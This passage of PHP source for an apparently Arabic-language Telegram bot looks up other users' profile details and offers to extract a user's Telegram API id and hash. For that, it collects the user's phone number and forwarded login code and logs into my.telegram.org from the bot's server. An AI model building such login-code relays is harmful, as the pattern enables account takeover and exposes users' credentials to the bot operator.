bot("sendPhoto",[
'chat_id'=>$chat_id,
"photo"=>"$res",
'caption'=>"⚡️Hєℓℓσ | ωσℓcσмє тσ вσт υѕєя ιηƒσ",
'message_id'=>$message_id,'reply_to_message_id'=>$message_id,'parse_mode'=>'MarkDown','reply_markup'=>json_encode(['inline_keyboard'=>[ 
[['text'=>"🃏┋ уσυя вισ",'callback_data'=>"bioo"]],
[['text'=>"$biography",'callback_data'=>"bioo"]],
[['text'=>"🎫┋ уσυя ι∂",'callback_data'=>"chatid"],['text'=>"$chat_id",'callback_data'=>"chatid"]],
[['text'=>"👑┋ уσυя ηαмє",'callback_data'=>"name"],['text'=>"$name",'callback_data'=>"name"]],
[['text'=>"🏷┋ уσυя υѕєяηαмє",'callback_data'=>"0"],['text'=>"@$username",'url'=>"t.me/$username"]],
[['text'=>"*┄┄┄му cнαηηєℓ┄┄┄*",'url'=>"t.me/BDthon"]],
]])
]);
}
if($data=="chatid"){bot('sendMessage',['chat_id'=>$chatid,'text'=>"$chatid",'message_id'=>$messageid,]);}
if($forward_from){
$get = bot('getchat',['chat_id'=>$forward_id])->result;
$username = $get->username ;
$biograph =  $get->bio; 
$res = bot("getUserProfilePhotos",[
"user_id"=>$forward_id,
"limit"=>1,
"offset"=>0,])->result->photos[0][2]->file_id;$path = bot("getFile",["file_id"=>$res])->result->file_path;file_put_contents("data/$r.jpg",file_get_contents("https://api.telegram.org/file/bot".API_KEY."/".$path));
bot("sendPhoto",['chat_id'=>$chat_id,
"photo"=>"$res",
'caption'=>"⚡️Hєℓℓσ | ωσℓcσмє тσ вσт υѕєя ιηƒσ",
'message_id'=>$message_id,'reply_to_message_id'=>$message_id,'parse_mode'=>'MarkDown','reply_markup'=>json_encode(['inline_keyboard'=>[ 
[['text'=>"🃏┋ вισ",'callback_data'=>"bioo"]],
[['text'=>"$biograph",'callback_data'=>"bioo"]],
[['text'=>"🆔┋ ƒσяωαя∂ ι∂",'callback_data'=>"forward_id"],['text'=>"$forward_id",'callback_data'=>"forward_id#".$forward_id]],
[['text'=>"💭┋ ƒσяωαя∂ ηαмє",'callback_data'=>"0"],['text'=>"$forward_name",'callback_data'=>"0"]],
[['text'=>"💳┋ ƒσяωαя∂ υѕєяηαмє",'callback_data'=>"0"],['text'=>"@$forward_username",'url'=>"t.me/$forward_username"]],
[['text'=>"*┄┄┄му cнαηηєℓ┄┄┄*",'url'=>"t.me/BDthon"]],
]])]);
}

$ex = explode("#",$data);
$data = $ex[0];
$fromid = $ex[1];

if($data=="forward_id"){
bot('sendMessage',[
'chat_id'=>$chat_id2,
'text'=>"$fromid",
]);
}

###الحساب###
$s = str_replace('ايدي ','',$text);
if($text == "ايدي $s"){
if(preg_match("/^[0-9]+$/", $s)){
$ok = bot('getchat',['chat_id'=>$s])->ok;
if($ok == "true"){
$get = bot('getchat',['chat_id'=>$s])->result;
$name = $get->first_name;
$user = $get->username;
$bio = $get->bio;
$photo = bot('getUserProfilePhotos',['user_id'=>$s])->result->photos[0][0]->file_id;
$type = bot('sendChatAction' , ['chat_id' =>$s,'action' => 'typing' ,])->ok;
if($type != 1){
$true = "محظور ❗";
}else{
$true = "غير محظور 😁";
}
if($user == null){
$user = "لا يوجد معرف ❗";
}
if($bio == null){
$bio = "لا يوجد بايو ❗";
}
if($photo == null){
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
- إسم المستخدم 🌸 : [$name](tg://user?id=$s)
- ايدي المستخدم🌸 : $s
- معرف المستخدم 🌸: *$user*
- بايو المستخدم 🌸: [$bio]()
- حالة المستخدم🌸 : *$true*
",'parse_mode'=>"MarkDown",]);
}else{
bot('sendphoto', [
'chat_id'=>$chat_id,
'photo'=>$photo,
'caption'=>"
- إسم المستخدم 🌸 : [$name](tg://user?id=$s)
- ايدي المستخدم 🌸 : $s
- معرف المستخدم 🌸 : *$user*
- بايو المستخدم 🌸 : [$bio]()
- حالة المستخدم 🌸 : *$true*
",'parse_mode'=>"MarkDown",]);
}
}else{
bot('sendMessage', [
'chat_id'=>$chat_id,
'text'=>"
عذرا لم أجد الشخص الذي تريده 😥
",'parse_mode'=>"MarkDown",]);
}
}
}


###لوحة الاستخراج###



function getUserAgent(){
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
	$userAgentArray[] = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0";
	$userAgentArray[] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
	$userAgentArray[] = "Mozilla/5.0 (iPad; CPU OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B202 Safari/604.1";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0";
	$userAgentArray[] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38";
	$userAgentArray[] = "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36";
	$userAgentArray[] = "Mozilla/5.0 (X11; CrOS x86_64 9901.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36";
	$getArrayKey = array_rand($userAgentArray);
	return $userAgentArray[$getArrayKey];
}
function curlj($da=[]){
$getUserAgent = getUserAgent();
$ch = curl_init($da["u"]);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT,$getUserAgent);
curl_setopt($ch, CURLOPT_REFERER, 'https://my.telegram.org/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, "curls/".$da["id"].".txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "curls/".$da["id"].".txt");
$rep = curl_exec($ch);
return $rep;
}
@mkdir("curls");
#--------
$update = file_get_contents("php://input");
$updateData = json_decode($update,true);
$messageData = isset($updateData["callback_query"]) ? $updateData["callback_query"] : $updateData["message"];
$chatId = isset($updateData["callback_query"]) ? $updateData["callback_query"]["message"]["chat"]["id"] : $updateData["message"]["chat"]["id"];
$chatType = isset($updateData["callback_query"]) ? $updateData["callback_query"]["message"]["chat"]["type"] : $updateData["message"]["chat"]["type"];
$messageId = isset($updateData["callback_query"]) ? $updateData["callback_query"]["message"]["message_id"] : $updateData["message"]["message_id"];
$messageText = $messageData["text"];
$data = $updateData["callback_query"]["data"];
$from_id = $messageData["from"]["id"];
$TokenInfo = json_decode(file_get_contents("https://api.telegram.org/bot".API_KEY."/getMe"));
$UserBot = $TokenInfo->result->username; 
$NameBot = $TokenInfo->result->first_name; 
$IdBot = $TokenInfo->result->id;
$status = json_decode(file_get_contents("settings.json"),true);
if ($chatType == "private"){
if($messageText == "لاستخراج Api id و api hash"){ 
bot("sendmessage",["chat_id"=>$chatId,"text"=>"*- اهلا بك في قسم الاستخراج لحسابك . \n- يمكنك من خلال البوت استخراج كل من Api id و api hash

• ┉ • ┉ • ┉ • ┉ • ┉ •

للرجوع للقائمه الرئيسيه اضغط  /start*","parse_mode"=>"markdown",'reply_markup'=>json_encode(['resize_keyboard'=>true, 'keyboard'=>[[["text"=>"أرسال جهتي 🎟","request_contact"=>true]]]])]);
}
if(strstr($messageText,":") and strstr($messageText,"my.telegram.org") and $status[$from_id]["phone"] and $status[$from_id]["hash"]){
$code = explode(":",$messageText)[1];
$code = explode("\n",$code)[1];
$login = curlj(["u"=>"https://my.telegram.org/auth/login?phone=".$status[$from_id]["phone"]."&random_hash=".$status[$from_id]["hash"]."&password=".$code,"id"=>$from_id]);
if($login == "true"){
$getcurlj = curlj(["u"=>"https://my.telegram.org/apps","id"=>$from_id]);
$api = explode('App api_hash:',$getcurlj)[1];
preg_match('#<input type="hidden" name="hash" value="(.*?)"/>#',$getcurlj,$edit_form);
preg_match('#<span class="form-control input-xlarge uneditable-input" onclick="(.*?)">(.*?)</span>#',$api,$api_hash);
preg_match('#<strong>(.*?)</strong>#',$getcurlj,$api_id);
$app_title = explode('"',explode('<input id="app_title" name="app_title" type="text" class="form-control input-xlarge" value="',$getcurlj)[1])[0];
$app_shortname = explode('"',explode('<input id="app_shortname" name="app_shortname" type="text" class="form-control input-xlarge" value="',$getcurlj)[1])[0];
if($api_id[1] && $api_hash){
bot("sendmessage",["chat_id"=>$from_id,"text"=>"- تم تسجيل دخول بنجاح ..\n- تم اكمال معلومات الاستخراج لحسابك سابقا وهي :\n\nApp title:`".$app_title."`\n\nApp shortname:`".$app_shortname."`\n\nApi id:`".$api_id[1]."`\n\nApi hash:\n`".$api_hash[2]."`","parse_mode"=>"markdown"]);
unset($status[$from_id]);
file_put_contents("settings.json", json_encode($status,128|32|256)); 
unlink("curls/".$from_id.".txt");
}else{
bot("sendmessage",["chat_id"=>$from_id,"text"=>"- تم تسجيل دخول بنجاح ..\n- لم تكمل معلومات الاستخراج لحسابك يمكنك الاكمال من خلال الموقع \nhttps://my.telegram.org/apps/create"]);
unlink("curls/".$from_id.".txt");
}
}else{
bot("sendmessage",["chat_id"=>$from_id,"text"=>"هذا الرمز غير صحيح ⛔."]);
}
}
if($messageData["contact"]){ 
$phone = $messageData["contact"]["phone_number"];
$code = curlj(["u"=>"https://my.telegram.org/auth/send_password?phone=".$phone,"id"=>$from_id]);
if(json_decode($code,1)["random_hash"] != null){
$status[$from_id]["phone"] = $phone;
$status[$from_id]["hash"] = json_decode($code,1)["random_hash"];
file_put_contents("settings.json", json_encode($status,128|32|256));
bot("sendmessage",["chat_id"=>$from_id,"text"=>"-👨🏻‍✈️ الان قم باعادة توجيه الرسالة،\n-🚸 التي ارسلت لك في الخاص،\n-📛 لا تقم بنسخ الكود فقط !."]);
}elseif(strstr($code,"Sorry, too many tries. Please try again later.")){
bot("sendmessage",["chat_id"=>$from_id,"text"=>"لقد تجاوزت الحد الأقصى من مرات المحاولة، يرجى المحاولة مرة اخرى في وقتٍ لاحق ⛔."]);
}else{
bot("sendmessage",["chat_id"=>$from_id,"text"=>"حدثت مشكلة ما ⛔."]);
}
}
#--------
}

